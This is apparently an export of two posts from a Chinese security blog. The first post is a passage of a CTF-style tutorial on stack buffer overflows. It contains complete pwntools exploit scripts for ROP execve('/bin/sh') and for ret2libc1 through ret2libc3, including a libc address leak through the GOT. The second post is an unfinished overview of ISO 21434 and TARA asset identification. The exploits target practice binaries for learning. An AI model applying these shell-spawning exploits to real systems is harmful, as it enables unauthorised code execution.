返回给应用程序。 应用程序调用系统调用的过程是： 把系统调用的编号存入 EAX； 把函数参数存入其它通用寄存器； 触发 0x80 号中断（int 0x80）。 简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell execve(&quot;/bin/sh&quot;,NULL,NULL) 其中，该程序是 32 位，所以我们需要使得 系统调用号，即 eax 应该为 0xb 第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。 第二个参数，即 ecx 应该为 0 第三个参数，即 edx 应该为 0 writeup 获得 int 0x80 的地址： ​ int_80h=0x08049421 Address Function Instruction .text:08049040 __libc_start_main mov eax, large gs:80h .text:08049058 __libc_start_main mov large gs:80h, eax .text:08049421 __libc_setup_tls int 80h; LINUX - sys_set_thread_area .text:0804C63C read_alias_file or dh, 80h 找到pop eax ebx ecx edx 的地址： eax_ret=0x080bb196 edx_ecx_ebx_ret=0x0806eb90 └─$ ROPgadget --binary rop --only 'pop|ret' |grep 'eax' 0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret 0x080bb196 : pop eax ; ret ;*******使用这个********* 0x0807217a : pop eax ; ret 0x80e 0x0804f704 : pop eax ; ret 3 0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret └─$ ROPgadget --binary rop --only 'pop|ret' |grep 'ebx' 0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret 0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret 0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret 0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret 0x080be23f : pop ebx ; pop edi ; ret 0x0806eb69 : pop ebx ; pop edx ; ret 0x08092258 : pop ebx ; pop esi ; pop ebp ; ret 0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10 0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14 0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc 0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4 0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8 0x08048913 : pop ebx ; pop esi ; pop edi ; ret 0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4 0x08049a94 : pop ebx ; pop esi ; ret 0x080481c9 : pop ebx ; ret 0x080d7d3c : pop ebx ; ret 0x6f9 0x08099c87 : pop ebx ; ret 8 0x0806eb91 : pop ecx ; pop ebx ; ret 0x0806336b : pop edi ; pop esi ; pop ebx ; ret 0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret ;;;;*******使用这个************* 0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret 0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret 0x0805c820 : pop esi ; pop ebx ; ret 0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x0807b6ed : pop ss ; pop ebx ; ret 获得 /bin/sh 字符串对应的地址： binsh=0x080BE408 .rodata:080BE408 00000008 C /bin/sh 栈溢出偏移计算： 下面就是对应的 payload，其中 0xb 为 execve 对应的系统调用号。 #!/usr/bin/env python from pwn import * sh = process('./rop') pop_eax_ret = 0x080bb196 pop_edx_ecx_ebx_ret = 0x0806eb90 int_0x80 = 0x08049421 binsh = 0x80be408 payload = flat( ['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80]) sh.sendline(payload) sh.interactive() ret2libc1 获得_system 地址和 binsh的地址，sysytem函数需要一个返回地址这里是bbbb #!/usr/bin/env python from pwn import * sh = process('./ret2libc1') system=0x08048460 binsh=0x08048720 payload = flat( ['A' * 112,system,'b'*4,binsh]) sh.sendline(payload) sh.interactive() ret2libc2 #!/usr/bin/env python from pwn import * p = process('./ret2libc2') system_plt=0x08048490 gets_plt=0x08048460 ebx_ret=0x0804843d buf_addr=0x804a080 payload = flat( ['A' * 112,gets_plt,ebx_ret,buf_addr,system,'b'*4,buf_addr]) p.sendline(payload) p.sendline(&quot;/bin/sh&quot;) p.interactive() ret2libc3 ctfwiki上的 exp是这样写的， #!/usr/bin/env python from pwn import * from LibcSearcher import LibcSearcher sh = process('./ret2libc3') ret2libc3 = ELF('./ret2libc3') puts_plt = ret2libc3.plt['puts'] #获取puts的plt地址 libc_start_main_got = ret2libc3.got['__libc_start_main'] #获取__libc_start_main在got表中的地址 main = ret2libc3.symbols['main'] #main函数的地址 在IDA中直接看到是 0x08048618 print &quot;leak libc_start_main_got addr and return to main again&quot; payload = flat(['A' * 112, puts_plt, main, libc_start_main_got]) # 溢出 112个字节 + 使用putsplt（即调用puts函数） + eip &gt; main函数 + puts的参数 最后的结果就是用puts返回了libc_start_main_got sh.sendlineafter('Can you find it !?', payload) print &quot;get the related addr&quot; libc_start_main_addr = u32(sh.recv()[0:4]) #这里接受了4字节的返回值 实际返回的是 __libc_start_main在got表中的地址 libc = LibcSearcher('__libc_start_main', libc_start_main_addr) #函数在libc中的地址 libcbase = libc_start_main_addr - libc.dump('__libc_start_main') #libc的base地址 = 函数在got表中的地址 - 函数在libc中的地址 system_addr = libcbase + libc.dump('system') binsh_addr = libcbase + libc.dump('str_bin_sh') #后面就没什么意思了 就是sysytem binsh # 他这里使用了LibcSearcher这个库 有点把原理给省略掉了 不容易理解 print &quot;get shell&quot; payload = flat(['A' * 104, system_addr, 0xdeadbeef, binsh_addr]) sh.sendline(payload) sh.interactive() system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。 即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。 所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。 那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。 然后ctfwiki中给出的方案就是泄露 __libc_start_main 的地址，这里我把他的exp稍微注释一下就可以看懂了， 因为他这里使用了LibcSearcher这个库 有点把原理给省略掉了 不容易理解， 所以在一番学习以后 有了下面这个exp 还有视频讲解， 君莫笑hhhhhhhh师傅的 #!/usr/bin/env python from pwn import * context.log_level = 'debug' proc = './ret2libc3' #!/usr/bin/env python elf = ELF(proc) p = process(proc) libc=ELF('./libc.so') if args.G: gdb.attach(p) p.sendlineafter('!?',b'a'*112 + p32(elf.plt['puts']) + p32(0x08048618) + p32(elf.got['puts'])) puts_addr = u32(p.recv(4)) libc_base = puts_addr - libc.symbols['puts'] system = libc_base + libc.symbols['system'] binsh = libc_base + 0x0000 #这个直接search /bin/sh 就可以找到 0xf7db5faa p.sendlineafter('!?',b'a'*112 + p32(system) + b'aaaa' + p32(0xf7db5faa)) p.interactive() * 格式化字符串漏洞 Format String 2023年5月，忙于工作，没有时间继续..... ","link":"https://xyzper.github.io/post/zhan-yi-chu/"},{"title":"ISO21434标准详细解读","content":"什么是ISO21434？ ISO21434“道路车辆-网络安全工程”是由国际组织标准（ISO）与汽车工程师协会（SAE）共同制定的汽车行业标准。本标准以其前身ISO26262为基础，ISO21434侧重于汽车电子产品设计和开发中固有的网络安全风险。它为安全管理、持续的安全相关活动以及风险评估和缓解方法提供了最新指南。 TARA分析的七个步骤 一、资产识别 Assest Identification 二、威胁场景分析 Threat Scenario Identification 三、威胁等级划分 Impact Rating 四、攻击路径分析 Attack Path Analysis 五、攻击可行性等级划分 Attack Feasibility Rating 六、风险等级确定 Risk Value Determination 七、风险处置决策 Risk Treatment Decision 一、资产识别 什么是资产？ 通俗来讲，就是车辆在使用的过程中，需要被保护不受网络攻击的信息，包括了通讯数据、用户隐私数据、ECU固件、算法等各种类型的信息。 资产定义的目的是识别出这些资产，确定每项资产的网络安全属性，从而分析出潜在的损害场景（Damage Scenario） —relation between the functionality of the item and the adverse consequence; ——功能与不良后果之间的关系 —description of harm to the road user; and/or ——对道路使用者的伤害的描述 —relevant assets. ——与其相关的资产 如何进行资产识别？ 在 21434中的15.3.2 Requirements and recommendations [RQ-15-02] 有如下的描述： NOTE 2 The identification of assets can be based on: ---- analysing the item definition; ---- performing an impact rating; ---- deriving assets from threat scenarios; and/or ---- using predefined catalogues. OTE 2 The identification of assets can be based on: ---- analysing the item definition; ---- performing an impact rating; ---- deriving assets from threat scenarios; and/or ---- using predefined catalogues. 所以针对于资产识别的工作可以从以下四个方向开展： 分析项目定义； 进行影响评级； 以下四个角度： safety 安全 financial财务 operational 运行工作 privacy隐私 （客户的个人偏好其网络安全属性是保密的，损害情况是由于失去保密性而未经客户同意泄露个人信息，该资产是存储在信息娱乐系统中的个人信息 从威胁情景中获得资产； 主要是依靠安全模型，或者是从事安全工作者自身的经验。标准给出了四个模型：EVITA[20], TVRA[21], PASTA[22], STRIDE 损坏场景是车辆高速行驶时，刹车完全制动与后续车辆碰撞（追尾碰撞）；该资产是制动功能的数据通信，其网络安全属性是完整性； 使用预定义的分类； 前置条件 必要条件 车辆与外部接口信息；可能需要到现在与客户一起梳理。 EE架构图： ECU之间的通信链路设计方案（通信方式、通信协议等）； 通信链路上的安全设计方案（若有）； ECU清单及详细名称，包括简称和全称； 整车功能清单，内容包括功能定义、功能详细描述，以及每一个功能关联到的ECU； 如有可以附加的条件 5. 与信息安全相关连的关键业务（或功能）的功能场景描述文档，如蓝牙钥匙功能规范； 6. 历史安全事件记录； 7. 安全事件处置策略； 数据流图：提供关于架构设计的硬件和软件组件及其接口规范的详细概述；提供有关正在开发的组件的操作环境的信息；以及详细的硬件、软件和操作要求； 不同的阶段 由于TARA威胁分析进入开发阶段的时间各有不同，在开发完成的中后期，整车的架构清晰、边界明确、功能定义完善，可以将每个信息传输实例作、范围内/外边界的每个信息传输实例、每个信息生成信息的实例、每一个信息转换实例均作为资产；如果是在开发的前期，可以将每个物理模块、每个数据等作为资产。 资产识别的结果 在资产识别阶段需要完成对资产的梳理，识别资产具有的信息安全属性，确定损害场景，并对损害场景进行影响评级（SFOP） 参考：Annex F 中的 Table F.1——Table F.4 其中对于信息安全属性的赋值和损害场景的设定需要具有一定专业能力的信息安全从业者参与过程。 二、威胁场景分析 三、威胁等级划分 四、攻击路径分析 五、攻击可行性等级划分 六、风险值确定 七、风险处置决策 ","link":"https://xyzper.github.io/post/iso21434-biao-zhun-xiang-xi-jie-du/"}]}